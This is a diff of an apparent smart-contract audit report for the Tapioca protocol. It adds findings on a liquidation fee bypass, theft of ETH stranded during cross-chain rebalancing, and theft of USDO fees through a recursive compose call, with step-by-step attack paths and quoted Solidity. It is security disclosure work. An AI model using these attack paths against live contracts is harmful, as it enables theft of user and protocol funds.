@@ -2,6 +2,8 @@
 
 Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/14 
 
+The protocol has acknowledged this issue.
+
 ## Found by 
 ComposableSecurity, bin2chen, cccz, cergyk
 ## Summary
@@ -171,7 +173,135 @@ a liquidator can still liquidate partially and leave the account in a worse shap
 
 Thanks @CergyK  Could you please invite: maarcweiss, [cryptotechmaker](https://github.com/cryptotechmaker) and 0xrektora to the repo? Thanks.
 
-# Issue H-3: Unupdated totalBorrow After BigBang Liquidation 
+**sherlock-admin4**
+
+The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/Tapioca-bar/pull/379.
+
+# Issue H-3: BBLiquidation::_liquidateUser liquidator can bypass protocol fee on liquidation by returning returnedShare == borrowShare 
+
+Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/33 
+
+## Found by 
+cergyk, duc
+## Summary
+When a liquidator liquidates a position on BigBang/Singularity market, they do not get the full liquidationBonus amount, but a callerShare which depends on the efficiency of the liquidation. 
+
+However since this share is taken after the liquidator has swapped the seized collateral to an asset amount, the liquidator can simply choose to return enough asset to repay the borrow, reducing the extra amount to zero.
+
+In that case the protocol fee and the caller share would be zero, but the liquidator has seized the full liquidation bonus during the swap.
+
+## Vulnerability Detail
+
+We can see that after the collateral has been seized from the liquidatee, the full amount of collateral with the liquidation bonus is sent to an arbitrary `liquidationReceiver` during `_swapCollateralWithAsset`:
+
+https://github.com/sherlock-audit/2024-02-tapioca/blob/main/Tapioca-bar/contracts/markets/bigBang/BBLiquidation.sol#L262-L263
+
+https://github.com/sherlock-audit/2024-02-tapioca/blob/main/Tapioca-bar/contracts/markets/bigBang/BBLiquidation.sol#L152-L159
+
+
+The liquidator can choose to send back only `borrowAmount` of asset, effectively keeping excess collateral to himself
+
+## Impact
+Liquidator steals the due fee from protocol during liquidation 
+
+## Code Snippet
+
+## Tool used
+
+Manual Review
+
+## Recommendation
+Consider adding a slippage control to the swap executed by the liquidator (e.g the liquidator must return at least 105% of `borrowAmount`, when seizing 110% of equivalent collateral)
+
+
+
+## Discussion
+
+**cryptotechmaker**
+
+Medium.
+The issue seems to be valid. However the user is not able to steal the full collateral, but only the bonus part, out of which he would have taken 90% anyway.
+
+**nevillehuang**
+
+request poc
+
+**sherlock-admin3**
+
+PoC requested from @CergyK
+
+Requests remaining: **3**
+
+**CergyK**
+
+Poc shared in a private repository
+
+The poc demonstrates how a malicious liquidator can bypass protocol fees which as @cryptotechmaker noted are at least 10% of liquidation bonus, but can be 20% in the worst case.
+
+Since no prerequisite is needed to do that on any liquidation, and the loss of fees incurred on the protocol is unbounded, this warrants high severity IMO 
+
+**CergyK**
+
+Coincidentally, the POC also demonstrates #32, since the price move used puts the user in bad debt but liquidation succeeds
+
+**nevillehuang**
+
+@cryptotechmaker Did you have a chance to look at this? I'm not sure if bypassing fees is high severity, I think I am inclined to keep medium
+
+**cryptotechmaker**
+
+Yes, it's a valid issue @nevillehuang 
+
+**sherlock-admin4**
+
+The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/Tapioca-bar/pull/378.
+
+**CergyK**
+
+Escalate
+
+This should be of high severity, as demonstrated, it enables to bypass protocol fees on any liquidation.
+For reference, issue #148 which claims freezing of the same protocol fees is rated as high
+
+**sherlock-admin2**
+
+> Escalate
+> 
+> This should be of high severity, as demonstrated, it enables to bypass protocol fees on any liquidation.
+> For reference, issue #148 which claims freezing of the same protocol fees is rated as high
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**nevillehuang**
+
+@CergyK Fair enough, the impact is similar to #148 so could be high severity (albeit protocol fees are not locked, just completely lost)
+
+**cvetanovv**
+
+I agree with the escalation. The impact is the same as #148.
+
+**cvetanovv**
+
+Planning to accept the escalation and make this issue a valid High.
+
+**Evert0x**
+
+Result:
+High
+Has Duplicates
+
+**sherlock-admin4**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [CergyK](https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/33/#issuecomment-2031295607): accepted
+
+# Issue H-4: Unupdated totalBorrow After BigBang Liquidation 
 
 Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/49 
 
@@ -341,7 +471,7 @@ Fixed in https://github.com/Tapioca-DAO/Tapioca-bar/pull/354
 
 The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/Tapioca-bar/pull/354.
 
-# Issue H-4: `_computeClosingFactor` function will return incorrect values, lower than needed, because it uses `collateralizationRate` to calculate the denominator 
+# Issue H-5: `_computeClosingFactor` function will return incorrect values, lower than needed, because it uses `collateralizationRate` to calculate the denominator 
 
 Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/53 
 
@@ -404,182 +534,268 @@ Fixed by https://github.com/Tapioca-DAO/Tapioca-bar/pull/355
 
 The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/Tapioca-bar/pull/355.
 
-# Issue H-5: `mTOFT` can be forced to receive the wrong ERC20 leading to token lockup 
+# Issue H-6: All ETH can be stolen during rebalancing for `mTOFTs` that hold native 
 
-Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/70 
+Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/69 
 
 ## Found by 
-GiuseppeDeLaZara
+0xadrii, GiuseppeDeLaZara
 ## Summary
-Due to Stargate's functionality of swapping one token on the source chain to another token on the destination chain, it is possible to force `mTOFT` to receive the wrong ERC20 token leading to token lockup.
+Rebalancing of ETH transfers the ETH to the destination mTOFT without calling `sgRecieve` which leaves the ETH hanging inside the `mTOFT` contract. 
+This can be exploited to steal all the ETH.
 
 ## Vulnerability Detail
-Stargate allows for swapping between different tokens. These are usually correlated stablecoins. They are defined as **Stargate Chains Paths** inside the docs: https://stargateprotocol.gitbook.io/stargate/developers/stargate-chain-paths.
-
-To give an example, a user can:
-
-- Provide USDC on Ethereum and receive USDT on Avalanche. 
-- Provide USDC on Avalanche and receive USDT on Arbitrum. 
-- etc.
-
-This can also be observed by just playing around with the Stargate UI: https://stargate.finance/transfer.
-
-The `Balancer.sol` contract initializes the connected OFTs through the [`initConnectedOFT`](https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/TapiocaZ/contracts/Balancer.sol#L224) function.
-This function is only callable by the admin and he specifies the src and dst pool ids. PoolIds refer to a specific StargatePool that holds the underlying asset(USDC, USDT, etc.): https://stargateprotocol.gitbook.io/stargate/developers/pool-ids.
-
-The issue here is that poolIds are not enforced during the rebalancing process. As it can be observed the `bytes memory _ercData` is not checked for its content.
+Rebalancing of `mTOFTs` that hold native tokens is done through the `routerETH` contract inside the `Balancer.sol` contract. 
+Here is the code snippet for the `routerETH` contract:
 
 ```solidity
 ## Balancer.sol
 
-function _sendToken(
-        address payable _oft,
-        uint256 _amount,
-        uint16 _dstChainId,
-        uint256 _slippage,
->>>        bytes memory _data
-    ) private {
-        address erc20 = ITOFT(_oft).erc20();
-        if (IERC20Metadata(erc20).balanceOf(address(this)) < _amount) {
-            revert ExceedsBalance();
-        }
-        {
->>>            (uint256 _srcPoolId, uint256 _dstPoolId) = abi.decode(_data, (uint256, uint256));
-            _routerSwap(_dstChainId, _srcPoolId, _dstPoolId, _amount, _slippage, _oft, erc20);
-        }
-    }
-
+if (address(this).balance < _amount) revert ExceedsBalance();
+        uint256 valueAmount = msg.value + _amount;
+        routerETH.swapETH{value: valueAmount}(
+            _dstChainId,
+            payable(this),
+            abi.encodePacked(connectedOFTs[_oft][_dstChainId].dstOft),
+            _amount,
+            _computeMinAmount(_amount, _slippage)
+        );
 ```
 
-It is simply decoded and passed as is. 
+The expected behaviour is ETH being received on the destination chain whereby `sgReceive` is called and ETH is deposited inside the `TOFTVault`.
 
-This is a problem and imagine the following scenario:
+```solidity
+## mTOFT.sol
 
-1. A Gelato bot calls the rebalance method for `mTOFT` that has USDC as erc20 on Ethereum.
-2. The bot encodes the `ercData` so `srcChainId = 1` pointing to USDC but `dstChainId = 2` pointing to USDT on Avalanche.
-3. Destination `mTOFT` is fetched from [`connectedOFTs`](https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/TapiocaZ/contracts/Balancer.sol#L307) and points to the mTOFT with USDC as erc20 on Avalanche.
-4. Stargate will take USDC on Ethereum and provide USDT on Avalanche.
-5. mTOFT with USDC as underlying erc20 on Avalanche will receive USDT token and it will remain lost as the balance of the `mTOFT` contract. 
+    function sgReceive(uint16, bytes memory, uint256, address, uint256 amountLD, bytes memory) external payable {
+        if (msg.sender != _stargateRouter) revert mTOFT_NotAuthorized();
 
-As this is a clear path for locking up wrong tokens inside the `mTOFT` contract, it is a critical issue.
+        if (erc20 == address(0)) {
+            vault.depositNative{value: amountLD}();
+        } else {
+            IERC20(erc20).safeTransfer(address(vault), amountLD);
+        }
+    }
+```
+
+By taking a closer look at the logic inside the [`routerETH`](https://www.codeslaw.app/contracts/ethereum/0x150f94B44927F078737562f0fcF3C95c01Cc2376) contract we can see that the transfer is called with an empty payload:
+```solidity
+    // compose stargate to swap ETH on the source to ETH on the destination
+    function swapETH(
+        uint16 _dstChainId,                         // destination Stargate chainId
+        address payable _refundAddress,             // refund additional messageFee to this address
+        bytes calldata _toAddress,                  // the receiver of the destination ETH
+        uint256 _amountLD,                          // the amount, in Local Decimals, to be swapped
+        uint256 _minAmountLD                        // the minimum amount accepted out on destination
+    ) external payable {
+        require(msg.value > _amountLD, "Stargate: msg.value must be > _amountLD");
+
+        // wrap the ETH into WETH
+        IStargateEthVault(stargateEthVault).deposit{value: _amountLD}();
+        IStargateEthVault(stargateEthVault).approve(address(stargateRouter), _amountLD);
+
+        // messageFee is the remainder of the msg.value after wrap
+        uint256 messageFee = msg.value - _amountLD;
+
+        // compose a stargate swap() using the WETH that was just wrapped
+        stargateRouter.swap{value: messageFee}(
+            _dstChainId,                        // destination Stargate chainId
+            poolId,                             // WETH Stargate poolId on source
+            poolId,                             // WETH Stargate poolId on destination
+            _refundAddress,                     // message refund address if overpaid
+            _amountLD,                          // the amount in Local Decimals to swap()
+            _minAmountLD,                       // the minimum amount swap()er would allow to get out (ie: slippage)
+            IStargateRouter.lzTxObj(0, 0, "0x"),
+            _toAddress,                         // address on destination to send to
+>>>>>>      bytes("")                           // empty payload, since sending to EOA
+        );
+    }
+```
+
+Notice the comment:
+
+> empty payload, since sending to EOA
+
+So `routerETH` after depositing ETH in `StargateEthVault` calls the regular `StargateRouter` but with an empty payload. 
+
+Next, let's see how the receiving logic works.
+
+As Stargate is just another application built on top of LayerZero the receiving starts inside the [`Bridge::lzReceive`](https://github.com/stargate-protocol/stargate/blob/5f0dfd290d8290678b933b64f31d119b3c4b4e6a/contracts/Bridge.sol#L58) function.
+As the type of transfer is `TYPE_SWAP_REMOTE` the `router::swapRemote` is called:
+
+```solidity
+function lzReceive(
+    uint16 _srcChainId,
+    bytes memory _srcAddress,
+    uint64 _nonce,
+    bytes memory _payload
+) external override {
+
+
+    if (functionType == TYPE_SWAP_REMOTE) {
+        (
+            ,
+            uint256 srcPoolId,
+            uint256 dstPoolId,
+            uint256 dstGasForCall,
+            Pool.CreditObj memory c,
+            Pool.SwapObj memory s,
+            bytes memory to,
+            bytes memory payload
+        ) = abi.decode(_payload, (uint8, uint256, uint256, uint256, Pool.CreditObj, Pool.SwapObj, bytes, bytes));
+        address toAddress;
+        assembly {
+            toAddress := mload(add(to, 20))
+        }
+        router.creditChainPath(_srcChainId, srcPoolId, dstPoolId, c);
+>>>>>>  router.swapRemote(_srcChainId, _srcAddress, _nonce, srcPoolId, dstPoolId, dstGasForCall, toAddress, s, payload);
+```
+
+[`Router:swapRemote`](https://github.com/stargate-protocol/stargate/blob/5f0dfd290d8290678b933b64f31d119b3c4b4e6a/contracts/Router.sol#L390-#L425) has two responsibilities:
+- First it calls `pool::swapRemote` that transfers the actual tokens to the destination address. In this case this is the `mTOFT` contract. 
+- Second it will call `IStargateReceiver(mTOFTAddress)::sgReceive` but only if the payload is not empty.
+
+```solidity
+ function _swapRemote(
+    uint16 _srcChainId,
+    bytes memory _srcAddress,
+    uint256 _nonce,
+    uint256 _srcPoolId,
+    uint256 _dstPoolId,
+    uint256 _dstGasForCall,
+    address _to,
+    Pool.SwapObj memory _s,
+    bytes memory _payload
+) internal {
+    Pool pool = _getPool(_dstPoolId);
+    // first try catch the swap remote
+    try pool.swapRemote(_srcChainId, _srcPoolId, _to, _s) returns (uint256 amountLD) {
+>>>>>>   if (_payload.length > 0) {
+            // then try catch the external contract call
+>>>>>>      try IStargateReceiver(_to).sgReceive{gas: _dstGasForCall}(_srcChainId, _srcAddress, _nonce, pool.token(), amountLD, _payload) {
+                // do nothing
+            } catch (bytes memory reason) {
+                cachedSwapLookup[_srcChainId][_srcAddress][_nonce] = CachedSwap(pool.token(), amountLD, _to, _payload);
+                emit CachedSwapSaved(_srcChainId, _srcAddress, _nonce, pool.token(), amountLD, _to, _payload, reason);
+            }
+        }
+    } catch {
+        revertLookup[_srcChainId][_srcAddress][_nonce] = abi.encode(
+            TYPE_SWAP_REMOTE_RETRY,
+            _srcPoolId,
+            _dstPoolId,
+            _dstGasForCall,
+            _to,
+            _s,
+            _payload
+        );
+        emit Revert(TYPE_SWAP_REMOTE_RETRY, _srcChainId, _srcAddress, _nonce);
+    }
+}
+```
+
+As payload is empty in case of using the `routerETH` contract the `sgReceive` function is never called. This means that the ETH is left sitting inside the `mTOFT` contract. 
+
+There are several ways of stealing the balance of `mTOFT`. 
+An attacker can use the [`mTOFT::sendPacket`](https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/TapiocaZ/contracts/tOFT/mTOFT.sol#L234) function and utilize the `lzNativeGasDrop` option to airdrop the balance of mTOFT to attacker's address on the destination chain: https://docs.layerzero.network/contracts/options#lznativedrop-option
+
+```solidity
+## TapiocaOmnichainSender.sol
+
+ function sendPacket(LZSendParam calldata _lzSendParam, bytes calldata _composeMsg)
+        external
+        payable
+        returns (MessagingReceipt memory msgReceipt, OFTReceipt memory oftReceipt)
+    {
+        // @dev Applies the token transfers regarding this send() operation.
+        // - amountDebitedLD is the amount in local decimals that was ACTUALLY debited from the sender.
+        // - amountToCreditLD is the amount in local decimals that will be credited to the recipient on the remote OFT instance.
+        (uint256 amountDebitedLD, uint256 amountToCreditLD) =
+            _debit(_lzSendParam.sendParam.amountLD, _lzSendParam.sendParam.minAmountLD, _lzSendParam.sendParam.dstEid);
+
+        // @dev Builds the options and OFT message to quote in the endpoint.
+        (bytes memory message, bytes memory options) =
+            _buildOFTMsgAndOptions(_lzSendParam.sendParam, _lzSendParam.extraOptions, _composeMsg, amountToCreditLD);
+
+        // @dev Sends the message to the LayerZero endpoint and returns the LayerZero msg receipt.
+        msgReceipt =
+            _lzSend(_lzSendParam.sendParam.dstEid, message, options, _lzSendParam.fee, _lzSendParam.refundAddress);
+        // @dev Formulate the OFT receipt.
+        oftReceipt = OFTReceipt(amountDebitedLD, amountToCreditLD);
+
+        emit OFTSent(msgReceipt.guid, _lzSendParam.sendParam.dstEid, msg.sender, amountDebitedLD);
+    }
+```
+
+All he has to do is specify the option type `lzNativeDrop` inside the `_lsSendParams.extraOptions` and the cost of calling `_lzSend` plus the airdrop amount will be paid out from the balance of `mTOFT`.
+
+As this is a complete theft of the rebalanced amount I'm rating this as a critical vulnerability.
+
 
 ## Impact
-The impact of this vulnerability is critical. It allows for locking up wrong tokens inside the mTOFT contract causing irreversible loss of funds. 
+All ETH can be stolen during rebalancing for mTOFTs that hold native tokens.
 
 ## Code Snippet
-- https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/TapiocaZ/contracts/Balancer.sol#L293
+- https://github.com/sherlock-audit/2024-02-tapioca/blob/dc2464f420927409a67763de6ec60fe5c028ab0e/TapiocaZ/contracts/Balancer.sol#L269-#L279
+
 
 ## Tool used
 
 Manual Review
 
 ## Recommendation
-The `initConnectedOFT` function should enforce the poolIds for the src and dst chains.The rebalance function should just fetch these saved values and use them.
+One way to fix this is use the alternative `RouterETH.sol` contract available from Stargate that allows for a payload to be sent. 
+It is denoted as `*RouterETH.sol` in the Stargate documentation: https://stargateprotocol.gitbook.io/stargate/developers/contract-addresses/mainnet
+This router has the `swapETHAndCall` interface:
 
-```diff
- 
-@@ -164,14 +176,12 @@ contract Balancer is Ownable {
-      * @param _dstChainId the destination LayerZero id
-      * @param _slippage the destination LayerZero id
-      * @param _amount the rebalanced amount
--     * @param _ercData custom send data
-      */
-     function rebalance(
-         address payable _srcOft,
-         uint16 _dstChainId,
-         uint256 _slippage,
--        uint256 _amount,
--        bytes memory _ercData
-+        uint256 _amount
-     ) external payable onlyValidDestination(_srcOft, _dstChainId) onlyValidSlippage(_slippage) {
-         {
-@@ -188,13 +204,13 @@ contract Balancer is Ownable {
-             if (msg.value == 0) revert FeeAmountNotSet();
-             if (_isNative) {
-                 if (disableEth) revert SwapNotEnabled();
-                 _sendNative(_srcOft, _amount, _dstChainId, _slippage);
-             } else {
--                _sendToken(_srcOft, _amount, _dstChainId, _slippage, _ercData);
-+                _sendToken(_srcOft, _amount, _dstChainId, _slippage);
-             }
-
- 
-@@ -221,7 +237,7 @@ contract Balancer is Ownable {
-      * @param _dstOft the destination TOFT address
-      * @param _ercData custom send data
-      */
--    function initConnectedOFT(address _srcOft, uint16 _dstChainId, address _dstOft, bytes memory _ercData)
-+    function initConnectedOFT(address _srcOft, uint256 poolId, uint16 _dstChainId, address _dstOft, bytes memory _ercData)
-         external
-         onlyOwner
-     {
-@@ -231,10 +247,8 @@ contract Balancer is Ownable {
-         bool isNative = ITOFT(_srcOft).erc20() == address(0);
-         if (!isNative && _ercData.length == 0) revert PoolInfoRequired();
- 
--        (uint256 _srcPoolId, uint256 _dstPoolId) = abi.decode(_ercData, (uint256, uint256));
--
-         OFTData memory oftData =
--            OFTData({srcPoolId: _srcPoolId, dstPoolId: _dstPoolId, dstOft: _dstOft, rebalanceable: 0});
-+            OFTData({srcPoolId: poolId, dstPoolId: poolId, dstOft: _dstOft, rebalanceable: 0});
- 
-         connectedOFTs[_srcOft][_dstChainId] = oftData;
-         emit ConnectedChainUpdated(_srcOft, _dstChainId, _dstOft);
- 
-     function _sendToken(
-         address payable _oft,
-         uint256 _amount,
-         uint16 _dstChainId,
--        uint256 _slippage,
--        bytes memory _data
-+        uint256 _slippage
-     ) private {
-         address erc20 = ITOFT(_oft).erc20();
-         if (IERC20Metadata(erc20).balanceOf(address(this)) < _amount) {
-             revert ExceedsBalance();
--        }
-+            }
-         {
--            (uint256 _srcPoolId, uint256 _dstPoolId) = abi.decode(_data, (uint256, uint256));
--            _routerSwap(_dstChainId, _srcPoolId, _dstPoolId, _amount, _slippage, _oft, erc20);
-+            _routerSwap(_dstChainId, _amount, _slippage, _oft, erc20);
-         }
-     }
- 
-     function _routerSwap(
-         uint16 _dstChainId,
--        uint256 _srcPoolId,
--        uint256 _dstPoolId,
-         uint256 _amount,
-         uint256 _slippage,
-         address payable _oft,
-         address _erc20
-     ) private {
-         bytes memory _dst = abi.encodePacked(connectedOFTs[_oft][_dstChainId].dstOft);
-+        uint256 poolId = connectedOFTs[_oft][_dstChainId].srcPoolId;
-         IERC20(_erc20).safeApprove(address(router), _amount);
-         router.swap{value: msg.value}(
-             _dstChainId,
--            _srcPoolId,
--            _dstPoolId,
-+            poolId,
-+            poolId,
-             payable(this),
-             _amount,
-             _computeMinAmount(_amount, _slippage),
+```solidity
+function swapETHAndCall(
+        uint16 _dstChainId, // destination Stargate chainId
+        address payable _refundAddress, // refund additional messageFee to this address
+        bytes calldata _toAddress, // the receiver of the destination ETH
+        SwapAmount memory _swapAmount, // the amount and the minimum swap amount
+        IStargateRouter.lzTxObj memory _lzTxParams, // the LZ tx params
+        bytes calldata _payload // the payload to send to the destination
+    ) external payable {
 ```
 
-Admin is trusted but you can optionally add additional checks inside the `initConnectedOFT` function to ensure that the poolIds are correct for the src and dst mTOFTs. 
+The contract on Ethereum can be found at: https://www.codeslaw.app/contracts/ethereum/0xb1b2eeF380f21747944f46d28f683cD1FBB4d03c. 
+And the Stargate docs specify its deployment address on all the chains where ETH is supported: https://stargateprotocol.gitbook.io/stargate/developers/contract-addresses/mainnet
 
 
 
 ## Discussion
 
+**cryptotechmaker**
+
+We had a chat with LZ about this a while ago and yes, the router cannot be used in this case. However the contract we're going to use is https://etherscan.io/address/0xeCc19E177d24551aA7ed6Bc6FE566eCa726CC8a9#code and it respects the IStargateRouter interface
+
+**windhustler**
+
+The contract you referenced above, i.e. [`StargateComposer`](https://etherscan.io/address/0xeCc19E177d24551aA7ed6Bc6FE566eCa726CC8a9#code) doesn't have the `swapETH` interface: 
+
+```solidity
+function swapETH(uint16 _dstChainId, address payable _refundAddress, bytes calldata _toAddress, uint256 _amountLD, uint256 _minAmountLD) external;
+```
+
+Your options are to refactor this to either use the [`*RouterETH: swapETHAndCall`](https://etherscan.io/address/0xb1b2eeF380f21747944f46d28f683cD1FBB4d03c#code) or the [`StargateComposer::swapETHAndCall`](https://etherscan.io/address/0xeCc19E177d24551aA7ed6Bc6FE566eCa726CC8a9#code) function.
+
+
+**cryptotechmaker**
+
+Good catch @windhustler
+
+
+**cryptotechmaker**
+
+Changed the status to 'Will fix'
+
+
 **sherlock-admin4**
 
-The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/TapiocaZ/pull/175.
+The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/TapiocaZ/pull/174; https://github.com/Tapioca-DAO/tapioca-periph/pull/198.
 
-# Issue H-6: TOFTOptionsReceiverModule miss cross-chain transformation for deposit and lock amounts 
+# Issue H-7: TOFTOptionsReceiverModule miss cross-chain transformation for deposit and lock amounts 
 
 Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/87 
 
@@ -750,7 +966,7 @@ That is, if after deployment a LSD be accepted that have different decimals acro
 
 The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/TapiocaZ/pull/178.
 
-# Issue H-7: Malicious MarketHelper contract can be used in TOFTMarketReceiverModule's leverageUpReceiver and marketRemoveCollateralReceiver functions 
+# Issue H-8: Malicious MarketHelper contract can be used in TOFTMarketReceiverModule's leverageUpReceiver and marketRemoveCollateralReceiver functions 
 
 Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/90 
 
@@ -911,7 +1127,7 @@ Medium
 
 The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/TapiocaZ/pull/180.
 
-# Issue H-8: exerciseOptionsReceiver() Lack of Ownership Check for oTAP, Allowing Anyone to Use oTAPTokenID 
+# Issue H-9: exerciseOptionsReceiver() Lack of Ownership Check for oTAP, Allowing Anyone to Use oTAPTokenID 
 
 Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/102 
 
@@ -1021,7 +1237,7 @@ add check `_options.from` is owner or be approved
 
 The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/Tapioca-bar/pull/360; https://github.com/Tapioca-DAO/TapiocaZ/pull/182.
 
-# Issue H-9: Wrong parameter in remote transfer makes it possible to steal all USDO balance from users 
+# Issue H-10: Wrong parameter in remote transfer makes it possible to steal all USDO balance from users 
 
 Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/111 
 
@@ -1491,7 +1707,510 @@ function _remoteTransferReceiver(address _srcChainSender, bytes memory _data) in
 
 The protocol team fixed this issue in PR/commit https://github.com/Tapioca-DAO/tapioca-periph/pull/200.
 
-# Issue H-10: TOFTOptionsReceiverModule will have the user lose the whole output TAP when requested to exercise all eligible options 
+# Issue H-11: Recursive _lzCompose() call can be leveraged to steal all generated USDO fees 
+
+Source: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/113 
+
+## Found by 
+0xadrii, ComposableSecurity
+## Summary
+
+It is possible to steal all generated USDO fees by leveraging the recursive _lzCompose() call triggered in compose calls.
+
+## Vulnerability Detail
+
+The `USDOFlashloanHelper` contract allows users to take USDO flash loans. When a user takes a flash loan some fees will be enforced and transferred to the USDO contract:
+
+```solidity
+// USDOFlashloanHelper.sol
+function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
+        external
+        override
+        returns (bool)
+    {
+			
+        ...
+
+        IERC20(address(usdo)).safeTransferFrom(address(receiver), address(usdo), fee);
+ 
+        _flashloanEntered = false;
+
+        return true;
+    }
+```
+
+Such fees can be later retrieved by the owner of the USDO contract via the `extractFees()` function:
+
+```solidity
+// Usdo.sol
+function extractFees() external onlyOwner { 
+        if (_fees > 0) {
+            uint256 balance = balanceOf(address(this));
+
+            uint256 toExtract = balance >= _fees ? _fees : balance;
+            _fees -= toExtract;
+            _transfer(address(this), msg.sender, toExtract);
+        }
+    }
+```
+
+However, such fees can be stolen by an attacker by leveraging a wrong parameter set when performing a compose call.
+
+When a compose call is triggered, the internal `_lzCompose()` call will be triggered. This call will check the `msgType_` and execute some logic according to the type of message requested. After executing the corresponding logic, it will be checked if there is an additional message by checking the `nextMsg_.length`. If the compose call had a next message to be called, a recursive call will be triggered and `_lzCompose()` will be called again:
+
+```solidity
+// TapiocaOmnichainReceiver.sol
+
+function _lzCompose(address srcChainSender_, bytes32 _guid, bytes memory oftComposeMsg_) internal {
+ 
+        // Decode OFT compose message.
+        (uint16 msgType_,,, bytes memory tapComposeMsg_, bytes memory nextMsg_) =
+            TapiocaOmnichainEngineCodec.decodeToeComposeMsg(oftComposeMsg_);
+
+        // Call Permits/approvals if the msg type is a permit/approval.
+        // If the msg type is not a permit/approval, it will call the other receivers. 
+        if (msgType_ == MSG_REMOTE_TRANSFER) {   
+            _remoteTransferReceiver(srcChainSender_, tapComposeMsg_);   
+        } else if (!_extExec(msgType_, tapComposeMsg_)) { 
+            // Check if the TOE extender is set and the msg type is valid. If so, call the TOE extender to handle msg.
+            if ( 
+                address(tapiocaOmnichainReceiveExtender) != address(0)
+                    && tapiocaOmnichainReceiveExtender.isMsgTypeValid(msgType_)
+            ) {  
+                bytes memory callData = abi.encodeWithSelector(
+                    ITapiocaOmnichainReceiveExtender.toeComposeReceiver.selector,
+                    msgType_,
+                    srcChainSender_, 
+                    tapComposeMsg_
+                ); 
+                (bool success, bytes memory returnData) =
+                    address(tapiocaOmnichainReceiveExtender).delegatecall(callData);
+                if (!success) {
+                    revert(_getTOEExtenderRevertMsg(returnData));
+                }
+            } else {
+                // If no TOE extender is set or msg type doesn't match extender, try to call the internal receiver.
+                if (!_toeComposeReceiver(msgType_, srcChainSender_, tapComposeMsg_)) {
+                    revert InvalidMsgType(msgType_);
+                }
+            }
+        }
+   
+        emit ComposeReceived(msgType_, _guid, tapComposeMsg_);
+        if (nextMsg_.length > 0) {
+            _lzCompose(address(this), _guid, nextMsg_);
+        }
+    }
+
+```
+
+As we can see in the code snippet’s last line, if `nextMsg_.length > 0` an additional compose call can be triggered . The problem with this call is that the first parameter in the  `_lzCompose()` call is hardcoded to be `address(this)` (address of USDO), making the `srcChainSender_` become the USDO address in the recursive compose call.
+
+An attacker can then leverage the remote transfer logic in order to steal all the USDO tokens held in the USDO contract (mainly fees generated by flash loans).
+
+Forcing the recursive call to be a remote transfer, `_remoteTransferReceiver()` will be called. Because the source chain sender in the recursive call is the USDO contract, the `owner` parameter in the remote transfer (the address from which the remote transfer tokens are burnt) can also be set to the USDO address, making the allowance check in the `_internalTransferWithAllowance()` call be bypassed, and effectively burning a desired amount from USDO.
+
+```solidity
+// USDO.sol
+function _remoteTransferReceiver(address _srcChainSender, bytes memory _data) internal virtual {
+        RemoteTransferMsg memory remoteTransferMsg_ = TapiocaOmnichainEngineCodec.decodeRemoteTransferMsg(_data);
+
+        
+        /// @dev xChain owner needs to have approved dst srcChain `sendPacket()` msg.sender in a previous composedMsg. Or be the same address.
+        _internalTransferWithAllowance(
+            remoteTransferMsg_.owner, _srcChainSender, remoteTransferMsg_.lzSendParam.sendParam.amountLD
+        );   
+          
+        ...
+    }
+
+function _internalTransferWithAllowance(address _owner, address srcChainSender, uint256 _amount) internal {
+        
+        if (_owner != srcChainSender) {   // <------- `_owner` and `srcChainSender` will both be the USDO address, so the check in `_spendAllowance()` won't be performed
+            _spendAllowance(_owner, srcChainSender, _amount);
+        }
+    
+        _transfer(_owner, address(this), _amount);
+    } 
+```
+
+After burning the tokens from USDO, the remote transfer will trigger a call to a destination chain to mint the burnt tokens in the origin chain. The receiver of the tokens can be different from the address whose tokens were burnt, so an attacker can obtain the minted tokens in the destination chain, effectively stealing all USDO balance from the USDO contract.
+
+An example attack path would be:
+
+1. An attacker creates a compose call from chain A to chain B. This compose call is actually composed of two messages:
+    1. The first message, which won’t affect the attack and is simply the initial step to trigger the attack in the destination chain
+    2. The second message (`nextMsg`), which is the actual compose message that will trigger the remote transfer and burn the tokens in chain B, and finally trigger a call back to chain A to mint he tokens
+2. The call is executed, chain B receives the call and triggers the first compose message (as demonstrated in the PoC, this first message is not important and can simply be a remote transfer call with a 0 amount of tokens). After triggering the first compose call, the second compose message is triggered. The USDO contract is set as the source chain sender and the remote transfer is called. Because the owner set in the compose call and the source chain sender are the same, the specified tokens in the remote transfer are directly burnt 
+3. Finally, the compose call triggers a call back to chain A to mint the burnt tokens in chain B, and tokens are minted to the attacker
+
+![attack_tapioca](https://github.com/sherlock-audit/2024-02-tapioca-0xadrii/assets/56537955/040b7b28-7eae-4948-b909-9d15ad5833d0)
+
+## Proof of concept
+
+The following proof of concept illustrates how the mentioned attack can take place. In order to execute the PoC, the following steps must be performed:
+
